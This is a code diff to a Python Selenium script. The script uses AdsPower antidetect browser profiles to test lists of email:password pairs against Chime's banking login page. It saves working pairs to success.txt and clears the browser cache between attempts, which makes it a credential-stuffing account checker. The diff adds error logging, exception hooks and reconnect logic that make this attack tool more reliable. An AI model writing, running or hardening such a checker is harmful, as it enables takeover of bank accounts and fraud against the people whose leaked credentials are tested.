@@ -2,6 +2,7 @@ import importlib.util
 import requests
 import sys
 import time
+import traceback
 from datetime import datetime
 from pathlib import Path
 from selenium import webdriver
@@ -15,11 +16,17 @@ from selenium.webdriver.support.ui import WebDriverWait
 EXPIRY_DATE = "2026-7-31 23:59:59"
 
 BASE_DIR = Path(sys.executable).parent if getattr(sys, "frozen", False) else Path(__file__).parent
+LOG_FILE = BASE_DIR / "log.txt"
+EMAIL_FILE = BASE_DIR / "email.txt"
+SUCCESS_FILE = BASE_DIR / "success.txt"
+CUSTOM_FILE = BASE_DIR / "custom.txt"
 
 
 def load_settings():
     config_path = BASE_DIR / "config.py"
-    if getattr(sys, "frozen", False) and config_path.exists():
+    if getattr(sys, "frozen", False):
+        if not config_path.exists():
+            raise FileNotFoundError(f"config.py not found in {BASE_DIR}")
         spec = importlib.util.spec_from_file_location("config", config_path)
         config = importlib.util.module_from_spec(spec)
         spec.loader.exec_module(config)
@@ -34,13 +41,6 @@ def load_settings():
     from config import ADSPOWER_API_KEY, ADSPOWER_BASE_URL, PROFILE_ID, SIGN_IN_WAIT, WAIT_TIME
 
     return ADSPOWER_API_KEY, ADSPOWER_BASE_URL, PROFILE_ID, WAIT_TIME, SIGN_IN_WAIT
-
-
-ADSPOWER_API_KEY, ADSPOWER_BASE_URL, PROFILE_ID, WAIT_TIME, SIGN_IN_WAIT = load_settings()
-EMAIL_FILE = BASE_DIR / "email.txt"
-SUCCESS_FILE = BASE_DIR / "success.txt"
-CUSTOM_FILE = BASE_DIR / "custom.txt"
-LOG_FILE = BASE_DIR / "log.txt"
 TARGET_URL = "https://app.chime.com/login"
 
 VERIFICATION_TEXT = (
@@ -70,6 +70,30 @@ def log(message):
     print(line)
     with open(LOG_FILE, "a", encoding="utf-8") as file:
         file.write(f"{line}\n")
+
+
+def log_error(message, exc=None, exc_traceback=None):
+    log(f"ERROR: {message}")
+    if exc is None:
+        return
+
+    log(f"{type(exc).__name__}: {exc}")
+    tb = exc_traceback if exc_traceback is not None else exc.__traceback__
+    if tb is not None:
+        for line in traceback.format_exception(type(exc), exc, tb):
+            for part in line.rstrip().splitlines():
+                log(part)
+
+
+def handle_uncaught_exception(exc_type, exc_value, exc_traceback):
+    if issubclass(exc_type, KeyboardInterrupt):
+        sys.__excepthook__(exc_type, exc_value, exc_traceback)
+        return
+    log_error("Unhandled error", exc_value, exc_traceback)
+    sys.exit(1)
+
+
+sys.excepthook = handle_uncaught_exception
 
 
 def check_expiry(expiry_date):
@@ -216,49 +240,83 @@ def check_account(driver, email, password, wait, long_wait):
     return long_wait.until(detect_login_result)
 
 
-check_expiry(EXPIRY_DATE)
-log("Script started")
-log(f"Using profile: {PROFILE_ID}")
-
-log("Starting AdsPower browser profile...")
-driver = connect_browser()
-log("AdsPower profile started successfully")
-wait = WebDriverWait(driver, WAIT_TIME)
-long_wait = WebDriverWait(driver, 90)
-
-log("Browser ready")
-total_accounts = len(load_credentials(EMAIL_FILE))
-log(f"Loaded {total_accounts} accounts from {EMAIL_FILE.name}")
-
-index = 0
-while True:
-    credentials = load_credentials(EMAIL_FILE)
-    if not credentials:
-        break
-
-    index += 1
-    email, password = credentials[0]
-    log(f"[{index}/{total_accounts}] Checking {email}...")
+def run():
     try:
-        result = check_account(driver, email, password, wait, long_wait)
-        log(f"{email}: {result}")
-        if result == "found":
-            save_account(SUCCESS_FILE, email, password)
-            log(f"{email}: saved to {SUCCESS_FILE.name}")
-        elif result == "incorrect":
-            log(f"{email}: incorrect password, not saved")
-        elif result:
-            save_account(CUSTOM_FILE, email, password)
-            log(f"{email}: saved to {CUSTOM_FILE.name}")
-    except TimeoutException:
-        log(f"{email}: login result not found")
+        ADSPOWER_API_KEY, ADSPOWER_BASE_URL, PROFILE_ID, WAIT_TIME, SIGN_IN_WAIT = load_settings()
     except Exception as error:
-        log(f"{email}: error - {error}")
-    finally:
-        remove_credential(EMAIL_FILE, email, password)
-        log(f"{email}: removed from {EMAIL_FILE.name}")
-        driver = clear_profile_cache(driver)
+        log_error("Failed to load settings", error)
+        sys.exit(1)
+
+    globals().update(
+        ADSPOWER_API_KEY=ADSPOWER_API_KEY,
+        ADSPOWER_BASE_URL=ADSPOWER_BASE_URL,
+        PROFILE_ID=PROFILE_ID,
+        WAIT_TIME=WAIT_TIME,
+        SIGN_IN_WAIT=SIGN_IN_WAIT,
+    )
+
+    check_expiry(EXPIRY_DATE)
+    log("Script started")
+    log(f"Using profile: {PROFILE_ID}")
+
+    try:
+        log("Starting AdsPower browser profile...")
+        driver = connect_browser()
+        log("AdsPower profile started successfully")
         wait = WebDriverWait(driver, WAIT_TIME)
         long_wait = WebDriverWait(driver, 90)
 
-log("Script finished")
+        log("Browser ready")
+        total_accounts = len(load_credentials(EMAIL_FILE))
+        log(f"Loaded {total_accounts} accounts from {EMAIL_FILE.name}")
+
+        index = 0
+        while True:
+            credentials = load_credentials(EMAIL_FILE)
+            if not credentials:
+                break
+
+            index += 1
+            email, password = credentials[0]
+            log(f"[{index}/{total_accounts}] Checking {email}...")
+            try:
+                result = check_account(driver, email, password, wait, long_wait)
+                log(f"{email}: {result}")
+                if result == "found":
+                    save_account(SUCCESS_FILE, email, password)
+                    log(f"{email}: saved to {SUCCESS_FILE.name}")
+                elif result == "incorrect":
+                    log(f"{email}: incorrect password, not saved")
+                elif result:
+                    save_account(CUSTOM_FILE, email, password)
+                    log(f"{email}: saved to {CUSTOM_FILE.name}")
+            except TimeoutException as error:
+                log_error(f"{email}: login result not found", error)
+            except Exception as error:
+                log_error(f"{email}: check failed", error)
+            finally:
+                remove_credential(EMAIL_FILE, email, password)
+                log(f"{email}: removed from {EMAIL_FILE.name}")
+                try:
+                    driver = clear_profile_cache(driver)
+                    wait = WebDriverWait(driver, WAIT_TIME)
+                    long_wait = WebDriverWait(driver, 90)
+                except Exception as error:
+                    log_error(f"{email}: cache clear failed", error)
+                    try:
+                        driver = connect_browser()
+                        wait = WebDriverWait(driver, WAIT_TIME)
+                        long_wait = WebDriverWait(driver, 90)
+                        log("Browser reconnected after cache clear failure")
+                    except Exception as reconnect_error:
+                        log_error(f"{email}: browser reconnect failed", reconnect_error)
+                        raise
+
+        log("Script finished")
+    except Exception as error:
+        log_error("Script stopped", error)
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    run()
